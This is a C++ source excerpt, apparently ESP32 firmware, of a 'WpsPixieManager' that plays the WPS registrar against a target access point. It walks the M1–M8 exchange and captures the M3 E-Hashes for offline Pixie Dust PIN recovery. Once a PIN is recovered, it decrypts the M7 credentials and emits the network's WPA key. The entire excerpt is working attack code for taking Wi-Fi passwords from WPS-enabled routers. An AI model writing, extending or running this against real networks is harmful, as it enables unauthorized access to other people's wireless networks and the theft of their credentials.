        frame.wps_length <= sizeof(lastFragmentData_) &&
        std::memcmp(frame.wps_data, lastFragmentData_, frame.wps_length) == 0) {
        return 0;
    }

    if (frame.wps_length == 0 ||
        wscFragmentLength_ > wscFragmentTotal_ ||
        frame.wps_length > wscFragmentTotal_ - wscFragmentLength_) {
        fragmentActive_ = false;
        return -1;
    }
    std::memcpy(wscFragment_ + wscFragmentLength_, frame.wps_data, frame.wps_length);
    wscFragmentLength_ += frame.wps_length;
    lastFragmentEapId_ = frame.eap_id;
    lastFragmentFlags_ = frame.flags;
    lastFragmentLength_ = frame.wps_length;
    if (frame.wps_length <= sizeof(lastFragmentData_)) {
        std::memcpy(lastFragmentData_, frame.wps_data, frame.wps_length);
    } else {
        lastFragmentLength_ = 0;
    }

    if (moreFragments) return 0;
    if (wscFragmentLength_ != wscFragmentTotal_) {
        fragmentActive_ = false;
        return -1;
    }
    fragmentActive_ = false;
    lastFragmentLength_ = 0;
    complete = frame;
    complete.flags = 0;
    complete.total_length = 0;
    complete.wps_data = wscFragment_;
    complete.wps_length = wscFragmentLength_;
    return 1;
}

void WpsPixieManager::rememberWscRequest(const EapWscFrame& frame) {
    if (frame.wps_length > sizeof(lastWscRequest_)) {
        haveLastWscRequest_ = false;
        return;
    }
    std::memcpy(lastWscRequest_, frame.wps_data, frame.wps_length);
    lastWscRequestLength_ = frame.wps_length;
    haveLastWscRequest_ = true;
}

void WpsPixieManager::rememberWscReply(const uint8_t* attributes, size_t length) {
    if (attributes == nullptr || length > sizeof(lastWscReply_)) {
        lastWscReplyLength_ = 0;
        return;
    }
    std::memcpy(lastWscReply_, attributes, length);
    lastWscReplyLength_ = length;
}

void WpsPixieManager::processEapol(const uint8_t* data, size_t length) {
    if (length < 4 || data[1] != 0x00) return;
    if (static_cast<size_t>(readBe16(data + 2)) + 4 > length) return;

    EapWscFrame wire{};
    if (parseEapolWsc(data, length, wire)) {
        if (wire.eap_code != 0x01) return;
        if (wire.opcode == kWscOpNack) {
            handleWscNack(wire);
            return;
        }
        if (wire.opcode == WSC_OP_DONE) {
            handleWscDone(wire);
            return;
        }
        if (wire.opcode != kWscOpMessage) return;

        EapWscFrame wsc = wire;
        if ((wire.flags & 0x03) != 0 || fragmentActive_) {
            const int fragmentResult = reassembleWscFragment(wire, wsc);
            if (fragmentResult < 0) {
                fail("fragment_invalid", "Invalid or oversized EAP-WSC fragment");
                return;
            }
            if (fragmentResult == 0) {
                if (!sendWscFragmentAck(wire.eap_id)) {
                    fail("fragment_ack_failed", "EAP-WSC fragment ACK TX failed");
                }
                return;
            }
        }

        WpsAttributes attributes{};
        if (!attributes.parse(wsc.wps_data, wsc.wps_length)) {
            fail("wsc_invalid", "Malformed WPS attribute stream");
            return;
        }
        if (haveLastWscRequest_ &&
            wsc.wps_length == lastWscRequestLength_ &&
            std::memcmp(wsc.wps_data, lastWscRequest_, wsc.wps_length) == 0) {
            emitProgress("retry", "Duplicate WPS request; replaying cached response");
            if (lastWscReplyLength_ != 0 &&
                !sendWscAttributes(
                    wsc.eap_id, lastWscReply_, lastWscReplyLength_, "wps-replay")) {
                fail("wsc_replay_failed", "WPS duplicate-response TX failed");
            }
            return;
        }

        rememberWscRequest(wsc);
        lastWscReplyLength_ = 0;
        if (isMessageType(attributes, MSG_M1)) {
            handleM1(wsc);
        } else if (isMessageType(attributes, MSG_M2D)) {
            handleM2D();
        } else if (isMessageType(attributes, MSG_M3)) {
            handleM3(wsc);
        } else if (isMessageType(attributes, MSG_M5)) {
            handleM5(wsc);
        } else if (isMessageType(attributes, MSG_M7)) {
            handleM7(wsc);
        }
        return;
    }

    const uint8_t* eap = data + 4;
    const size_t eapolLength = readBe16(data + 2);
    if (eapolLength < 5) return;
    if (eap[0] == 0x01 && eap[4] == 0x01) {
        emitProgress("identity", "EAP Identity Request received");
        if (state_ == State::WaitM3 || state_ == State::WaitM5 ||
            state_ == State::WaitM7 || state_ == State::WaitRecoveredPin) {
            sendIdentityResponse(eap[1]);
            return;
        }
        if (state_ == State::WaitIdentity || state_ == State::WaitM1) {
            if (sendIdentityResponse(eap[1])) {
                state_ = State::WaitM1;
                emitProgress("identity", "WPS Identity Response sent");
            } else {
                fail("identity_failed", "identity response TX failed");
            }
        }
    }
}

void WpsPixieManager::handleM1(const EapWscFrame& frame) {
    if (state_ != State::WaitM1 && state_ != State::WaitM3) return;
    WpsAttributes attributes{};
    if (!attributes.parse(frame.wps_data, frame.wps_length) ||
        !isMessageType(attributes, MSG_M1)) {
        return;
    }
    const WpsAttribute* nonce = attributes.find(ATTR_ENROLLEE_NONCE);
    const WpsAttribute* pke = attributes.find(ATTR_PUBLIC_KEY);
    const WpsAttribute* enrolleeMac = attributes.find(ATTR_MAC_ADDR);
    if (nonce == nullptr || nonce->length != 16 ||
        pke == nullptr || pke->length != crypto::kPublicKeyLength ||
        enrolleeMac == nullptr || enrolleeMac->length != 6 ||
        std::memcmp(enrolleeMac->value, targetBssid_, 6) != 0) {
        fail("m1_invalid", "M1 missing/invalid E-Nonce, PKE, or enrollee MAC");
        return;
    }
    m1WaitStartedMs_ = 0;
    std::memcpy(enrolleeNonce_, nonce->value, sizeof(enrolleeNonce_));
    std::memcpy(enrolleePublicKey_, pke->value, sizeof(enrolleePublicKey_));
    esp_fill_random(registrarNonce_, sizeof(registrarNonce_));
    esp_fill_random(uuidR_, sizeof(uuidR_));
    uint8_t privateKey[32];
    esp_fill_random(privateKey, sizeof(privateKey));

    RegistrarM2Result result{};
    const char* error = nullptr;
    const bool built = buildRegistrarM2(
        frame.wps_data,
        frame.wps_length,
        privateKey,
        sizeof(privateKey),
        registrarNonce_,
        uuidR_,
        result,
        &error);
    crypto::secureZero(privateKey, sizeof(privateKey));
    if (!built) {
        fail("m2_failed", error == nullptr ? "M2 build failed" : error);
        return;
    }
    std::memcpy(authKey_, result.authKey, sizeof(authKey_));
    std::memcpy(keyWrapKey_, result.keyWrapKey, sizeof(keyWrapKey_));
    std::memcpy(registrarPublicKey_, result.registrarPublicKey, sizeof(registrarPublicKey_));
    std::memcpy(lastM2_, result.attributes, result.attributesLength);
    lastM2Length_ = result.attributesLength;
    emitProgress("m1", "M1 received; enrolling registrar DH/AuthKey");

    if (!sendWscAttributes(frame.eap_id, lastM2_, lastM2Length_, "wps-m2")) {
        fail("m2_tx_failed", "M2 TX failed");
        return;
    }
    rememberWscReply(lastM2_, lastM2Length_);
    state_ = State::WaitM3;
    m3WaitStartedMs_ = millis();
    emitProgress("m2", "M2 sent; waiting for M3");
}

void WpsPixieManager::handleM2D() {
    fail("m2d", "AP requires configuration; WPS PIN registration is not accepted");
}

void WpsPixieManager::handleM3(const EapWscFrame& frame) {
    if (state_ != State::WaitM3) return;
    WpsAttributes attributes{};
    if (!attributes.parse(frame.wps_data, frame.wps_length) ||
        !isMessageType(attributes, MSG_M3)) {
        return;
    }
    bool matches = false;
    const char* error = nullptr;
    if (!verifyM3Authenticator(
            lastM2_, lastM2Length_, frame.wps_data, frame.wps_length,
            authKey_, matches, &error) || !matches) {
        fail("m3_auth_failed", error == nullptr ? "M3 Authenticator mismatch" : error);
        return;
    }
    const WpsAttribute* hash1 = attributes.find(ATTR_E_HASH1);
    const WpsAttribute* hash2 = attributes.find(ATTR_E_HASH2);
    if (hash1 == nullptr || hash1->length != 32 || hash2 == nullptr || hash2->length != 32) {
        fail("m3_invalid", "M3 missing E-Hashes");
        return;
    }
    std::memcpy(eHash1_, hash1->value, sizeof(eHash1_));
    std::memcpy(eHash2_, hash2->value, sizeof(eHash2_));
    if (frame.wps_length > sizeof(lastM3_)) {
        fail("m3_invalid", "M3 payload too large");
        return;
    }
    std::memcpy(lastM3_, frame.wps_data, frame.wps_length);
    lastM3Length_ = frame.wps_length;
    lastM3EapId_ = frame.eap_id;
    emitProgress("m3", "M3 received; Authenticator PASS");

    if (captureOnly_) {
        emitWrongPin(false, false, true);
        recoveredPinWaitStartedMs_ = millis();
        state_ = State::WaitRecoveredPin;
        emitProgress("m3", "M3 captured; WPS session kept open awaiting recovered PIN");
        return;
    }

    uint8_t secretNonce1[kRegistrarSecretNonceLength];
    uint8_t iv[16];
    esp_fill_random(secretNonce1, sizeof(secretNonce1));
    esp_fill_random(registrarSecretNonce2_, sizeof(registrarSecretNonce2_));
    esp_fill_random(iv, sizeof(iv));
    RegistrarM4Result m4{};
    if (!buildRegistrarM4(
            lastM3_, lastM3Length_, enrolleeNonce_, enrolleePublicKey_,
            registrarPublicKey_, reinterpret_cast<const uint8_t*>(pin_.c_str()),
            pin_.length(), authKey_, keyWrapKey_, secretNonce1,
            registrarSecretNonce2_, iv, m4, &error)) {
        crypto::secureZero(secretNonce1, sizeof(secretNonce1));
        fail("m4_build_failed", error == nullptr ? "M4 build failed" : error);
        return;
    }
    crypto::secureZero(secretNonce1, sizeof(secretNonce1));
    std::memcpy(lastM4_, m4.attributes, m4.attributesLength);
    lastM4Length_ = m4.attributesLength;
    if (!sendWscAttributes(frame.eap_id, lastM4_, lastM4Length_, "wps-m4")) {
        fail("m4_tx_failed", "M4 TX failed");
        return;
    }
    rememberWscReply(lastM4_, lastM4Length_);
    state_ = State::WaitM5;
    emitProgress("m4", "M4 sent; proving PIN with enrollee");
}

void WpsPixieManager::handleM5(const EapWscFrame& frame) {
    if (state_ != State::WaitM5) return;
    WpsAttributes attributes{};
    if (!attributes.parse(frame.wps_data, frame.wps_length) ||
        !isMessageType(attributes, MSG_M5)) {
        return;
    }
    if (frame.wps_length > sizeof(lastM5_)) {
        fail("m5_invalid", "M5 payload too large");
        return;
    }
    uint8_t eSnonce1[kRegistrarSecretNonceLength]{};
    const char* error = nullptr;
    if (!processRegistrarM5(
            lastM4_, lastM4Length_, frame.wps_data, frame.wps_length,
            registrarNonce_, authKey_, keyWrapKey_, eSnonce1, &error)) {
        fail("m5_auth_failed", error == nullptr ? "M5 rejected" : error);
        return;
    }
    std::memcpy(lastM5_, frame.wps_data, frame.wps_length);
    lastM5Length_ = frame.wps_length;
    emitProgress("m5", "M5 received; first PIN half valid");

    uint8_t iv[16];
    esp_fill_random(iv, sizeof(iv));
    RegistrarM6Result m6{};
    if (!buildRegistrarM6(
            lastM5_, lastM5Length_, enrolleeNonce_, registrarSecretNonce2_,
            authKey_, keyWrapKey_, iv, m6, &error)) {
        fail("m6_build_failed", error == nullptr ? "M6 build failed" : error);
        return;
    }
    std::memcpy(lastM6_, m6.attributes, m6.attributesLength);
    lastM6Length_ = m6.attributesLength;
    if (!sendWscAttributes(frame.eap_id, lastM6_, lastM6Length_, "wps-m6")) {
        fail("m6_tx_failed", "M6 TX failed");
        return;
    }
    rememberWscReply(lastM6_, lastM6Length_);
    state_ = State::WaitM7;
    emitProgress("m6", "M6 sent; waiting for encrypted settings");
}

void WpsPixieManager::handleM7(const EapWscFrame& frame) {
    if (state_ != State::WaitM7) return;
    WpsAttributes attributes{};
    if (!attributes.parse(frame.wps_data, frame.wps_length) ||
        !isMessageType(attributes, MSG_M7)) {
        return;
    }
    RegistrarM7Result credentials{};
    const char* error = nullptr;
    if (!processRegistrarM7(
            lastM6_, lastM6Length_, frame.wps_data, frame.wps_length,
            registrarNonce_, authKey_, keyWrapKey_, credentials, &error)) {
        fail("m7_auth_failed", error == nullptr ? "M7 rejected" : error);
        return;
    }
    emitProgress("m7", "M7 received; credential decryption PASS");

    uint8_t iv[16];
    esp_fill_random(iv, sizeof(iv));
    RegistrarM8Result m8{};
    if (!buildRegistrarM8(
            frame.wps_data, frame.wps_length, enrolleeNonce_, credentials,
            authKey_, keyWrapKey_, iv, m8, &error)) {
        fail("m8_build_failed", error == nullptr ? "M8 build failed" : error);
        return;
    }
    if (!sendWscAttributes(frame.eap_id, m8.attributes, m8.attributesLength, "wps-m8")) {
        fail("m8_tx_failed", "M8 TX failed");
        return;
    }
    rememberWscReply(m8.attributes, m8.attributesLength);
    pendingCredentials_ = credentials;
    state_ = State::WaitWscDone;
    wscDoneWaitStartedMs_ = millis();
    emitProgress("m8", "M8 sent; waiting for WSC_DONE");
}

void WpsPixieManager::handleWscDone(const EapWscFrame& frame) {
    if (state_ != State::WaitWscDone || frame.wps_length == 0) return;
    WpsAttributes attributes{};
    if (!attributes.parse(frame.wps_data, frame.wps_length) ||
        !isMessageType(attributes, MSG_WSC_DONE)) {
        return;
    }
    const WpsAttribute* enrolleeNonce = attributes.find(ATTR_ENROLLEE_NONCE);
    const WpsAttribute* registrarNonce = attributes.find(ATTR_REGISTRAR_NONCE);
    if (enrolleeNonce != nullptr && enrolleeNonce->length == 16 &&
        std::memcmp(enrolleeNonce->value, enrolleeNonce_, 16) != 0) {
        fail("wsc_done_nonce_mismatch", "WSC_DONE enrollee nonce mismatch");
        return;
    }
    if (registrarNonce != nullptr && registrarNonce->length == 16 &&
        std::memcmp(registrarNonce->value, registrarNonce_, 16) != 0) {
        fail("wsc_done_nonce_mismatch", "WSC_DONE registrar nonce mismatch");
        return;
    }

    uint8_t ackAttributes[128];
    size_t ackLength = 0;
    const char* error = nullptr;
    if (!buildRegistrarWscAck(
            enrolleeNonce_, registrarNonce_, ackAttributes, sizeof(ackAttributes),
            ackLength, &error)) {
        emitProgress("complete", "WSC_ACK build failed; finalizing from valid M7 credentials");
    } else if (!sendWscOpcode(frame.eap_id, WSC_OP_ACK, ackAttributes, ackLength, "wps-ack")) {
        emitProgress("complete", "WSC_ACK TX failed; finalizing from valid M7 credentials");
    } else {
        emitProgress("complete", "WSC_DONE acknowledged");
    }

    emitPsk(pendingCredentials_.networkKey, pendingCredentials_.networkKeyLength);
    finish();
}

void WpsPixieManager::handleWscNack(const EapWscFrame& frame) {
    WpsAttributes attributes{};
    int configError = -1;
    if (frame.wps_length > 0 && attributes.parse(frame.wps_data, frame.wps_length)) {
        const WpsAttribute* configErrorAttribute = attributes.find(0x1009);
        if (configErrorAttribute != nullptr && configErrorAttribute->length == 2) {
            configError = readBe16(configErrorAttribute->value);
        }
    }

    const bool firstHalfValid = state_ == State::WaitM7;
    if (configError == 15) {
        fail("wps_locked", "AP reports WPS setup locked");
        return;
    }
    if (state_ == State::WaitM5 || state_ == State::WaitM7) {
        if (configError == 18 || configError < 0) {
            emitWrongPin(firstHalfValid, true, false);
            finish();
        } else {
            fail("wsc_nack", String("AP rejected WPS with configuration error ") + configError);
        }
        return;
    }
    fail("nack_before_m3", "AP rejected WPS transaction before PIN validation");
}
